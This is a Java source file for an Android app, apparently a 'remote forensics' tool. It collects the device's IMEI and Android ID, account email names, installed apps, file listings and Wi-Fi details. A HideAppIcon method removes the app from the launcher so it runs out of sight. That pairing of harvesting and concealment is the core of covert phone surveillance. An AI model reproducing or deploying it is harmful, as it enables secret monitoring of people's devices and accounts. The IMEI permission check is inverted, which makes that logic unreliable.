package com.peritoflores.androidremoteforensics;


import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.util.Patterns;

import com.peritoflores.androidremoteforensics.ahm.FileManager;

import org.json.JSONArray;

import java.util.List;
import java.util.regex.Pattern;

import static android.content.Context.BATTERY_SERVICE;
import static android.content.Context.CONNECTIVITY_SERVICE;

public class AppUtils {
    Context ctx;
    static final String TAG = "AppUtils";


    public String getPhoneDescription() {
        //Phone Description
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        int version = Build.VERSION.SDK_INT;
        String versionRelease = Build.VERSION.RELEASE;

        String phonedescription = "manufacturer " + manufacturer
                + " \n model " + model
                + " \n version " + version
                + " \n versionRelease " + versionRelease;


        String android_id = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
        //String imei = android.os.SystemProperties.get(android.telephony.TelephonyProperties.PROPERTY_IMSI);

        return phonedescription + android_id + getImei();
    }

    public String getImei() {
        final TelephonyManager telephonyManager = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            //Hacemos la validación de métodos, ya que el método getDeviceId() ya no se admite para android Oreo en adelante, debemos usar el método getImei()
            if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                try {
                    return telephonyManager.getImei();
                } catch (Exception e) {
                    Log.e(TAG, "Error en getImei");
                }
            }

        }
        return "IMEI not FOUND";
    }


    public int getBatteryLevel() {
        //Get battery level
        BatteryManager bm = (BatteryManager) ctx.getSystemService(BATTERY_SERVICE);
        int batLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        return batLevel;
    }

    public org.json.JSONArray getFileList(String filepath) {
        JSONArray filelist = FileManager.walk(filepath);
        return filelist;
    }


    public List<ApplicationInfo> getListOfInstalledApps() {
        //Get App Installed List
        PackageManager packageManager = ctx.getPackageManager();
        List<ApplicationInfo> list = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
        Log.d(TAG, list.toString());
        return list;

    }

    public String getEmails() {
        String accountsnames = "";
        Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
        Account[] accounts = AccountManager.get(ctx).getAccounts();
        for (Account account : accounts) {
            accountsnames = accountsnames + " " + account.name;
            Log.i(TAG, "name:" + account.name);

        }
        return accountsnames;
    }

    public String getWifiStatus() {
        //Get Wifi status and SSID
        ConnectivityManager connManager = (ConnectivityManager) ctx.getSystemService(CONNECTIVITY_SERVICE);
        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        return mWifi.toString();

    }


    public void HideAppIcon() {
        //Hide Icon
        PackageManager p = ctx.getPackageManager();
        ComponentName componentName = new ComponentName(ctx, MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

    }

    public AppUtils(Context ctx) {
        this.ctx = ctx;
    }
 /*   public void HideApp(){
        PackageManager p = ctx.getPackageManager();

        ComponentName componentName = new ComponentName(ctx);

        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);    }
public void unHideApp(){
    PackageManager p = ctx.getPackageManager();
    ComponentName componentName = new ComponentName(this);
p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);

}
*/
}
